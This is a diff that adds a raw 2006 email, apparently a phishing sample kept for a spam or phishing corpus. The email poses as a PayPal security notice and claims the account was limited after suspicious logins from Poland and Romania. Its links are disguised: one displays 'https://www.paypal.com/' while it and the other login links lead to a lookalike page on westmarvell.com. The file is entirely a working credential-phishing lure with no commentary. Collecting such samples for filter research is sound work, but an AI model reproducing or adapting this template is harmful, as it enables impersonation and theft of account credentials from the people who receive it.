@@ -1,0 +1,178 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 677E82AE47
+ for <user@example.com>; Tue, 21 Feb 2006 15:44:37 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 5908A621CAC; Tue, 21 Feb 2006 15:44:37 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 36F26621CA0
+ for <user@example.com>; Tue, 21 Feb 2006 15:44:37 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id PAA17020
+ for user@example.com; Tue, 21 Feb 2006 15:44:36 -0500
+Received: from mail.com ([211.53.8.16])
+ by mail.example.com with SMTP id PAA17012
+ for <user@example.com>; Tue, 21 Feb 2006 15:44:35 -0500
+Message-Id: <200602212044.PAA17012@mail.example.com>
+From: "service@paypal.com" <service@paypal.com>
+Subject: Unauthorized access to your PayPal account !
+Date: Wed, 22 Feb 2006 05:43:16 +0900
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 6212
+Lines: 141
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 314
+
+<title>paypal</title>
+<p><A href="http://www.paypal.com/cgi-bin/webscr?cmd=_home"><IMG src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></A> 
+</p>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tr> 
+    <td background="http://images.PayPal.com/images/bg_clk.gif"
+width=100%><img src="http://images.PayPal.com/images/pixel.gif" height="29"
+width="1" border="0"></td>
+  </tr>
+</table>
+<p><b><font size="3">PayPal Security Measures!</font></b></p>
+<p><font face="Arial"><tt><font face="verdana,arial,helvetica,sans-serif">We are 
+  contacting you to remind you that: on 21 February 2006 our Account Review Team identified 
+  some unusual activity in your account, one or more attempts to log in to your 
+  PayPal account from a foreign IP address. </font></tt></font></p>
+<font face="Arial"><tt><font face="verdana,arial,helvetica,sans-serif">
+<table>
+  <tr bgcolor="#CCDDEE"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> IP Address</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Time</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Country</font></p>
+    </td>
+  </tr>
+  <tr bgcolor="#EEEEEE"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">80.53.1.130</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">February 20, 
+        2006 15:05:08 PDT</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Poland</font></p>
+    </td>
+  </tr>
+  <tr bgcolor="#FFFFFF"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">80.53.255.174</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">February 20, 
+        2006 15:07:58 PDT</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Poland</font></p>
+    </td>
+  </tr>
+  <tr bgcolor="#EEEEEE"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">141.85.99.169</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">February  19, 
+        2006 15:13:09 PDT</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Romania</font></p>
+    </td>
+  </tr>
+  <tr bgcolor="#FFFFFF"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">141.85.99.169</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">February 19, 
+        2006 21:28:08 PDT</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Romania</font></p>
+    </td>
+  </tr>
+  <tr bgcolor="#EEEEEE"> 
+    <td width="103"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">195.61.146.130</font></p>
+    </td>
+    <td width="205"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">February 19, 
+        2006 21:33:43 PDT</font></p>
+    </td>
+    <td width="67"> 
+      <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Romania</font></p>
+    </td>
+  </tr>
+</table>
+</font></tt></font> 
+<p>In accordance with PayPal's User Agreement and to ensure that your account 
+  has not been compromised, access to your account was limited. Your account access 
+  will remain limited until this issue has been resolved. To secure your account 
+  and quickly restore full access, we may require some additional information 
+  from you. </p>
+<p style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align="justify"></p>
+<p style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align="justify"><font face="Arial"><tt>To 
+  securely confirm your PayPal information please go directly to <a href="http://westmarvell.com/webscr/update.html?account743476" target="_blank">https://www.paypal.com/</a> 
+  log in to your PayPal account and perform the steps necessary to restore your 
+  account access as soon as possible or click bellow:</tt></font></p>
+<p style="MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align="justify"> </p>
+<table width="75%" cellpadding="1" cellspacing="0" border="0"
+bgcolor="#FFE65C" align=left>
+  <tr> 
+    <td> 
+      <table width="100%" cellpadding="4" cellspacing="0"                                                      
+                                                              
+                                                                                            
+                                                                                          border="0" bgcolor="#FFFECD" align="center">
+        <tr> 
+          <td class="pp_textbold" align="center"> 
+          <td class="pp_sansserif" align="center"><font face="Arial"><tt> To continue 
+            your verification procedure <a href="http://westmarvell.com/webscr/update.html?account743476" target="_blank">click 
+            here</a></tt></font></td>
+        
+      </table>
+    </td>
+  </tr>
+</table>
+<p> </p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Thank you for using 
+  PayPal!<br>
+  The PayPal Team </font></p>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tr> 
+    <td class="pp_footer"> <font color="#aaaaaa" face="Verdana, Arial, Helvetica, sans-serif" size="2">Please 
+      do not reply to this e-mail. Mail sent to this address cannot be answered. 
+      For assistance, <a href="http://westmarvell.com/webscr/update.html?account743476" target="_blank">	
+      log in</a> to your PayPal account and choose the "Help" link in the footer 
+      of any page.<br>
+      <br class="h10">
+      To receive email notifications in plain text instead of HTML, update your 
+      preferences <a href="https://www.paypal.com/us/PREFS-NOTI">here</a>. </font></td>
+  </tr>
+  <tr> 
+    <td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10"
+width="1" border="0"></td>
+  </tr>
+</table>
+<p> </p>
+</BODY></HTML>
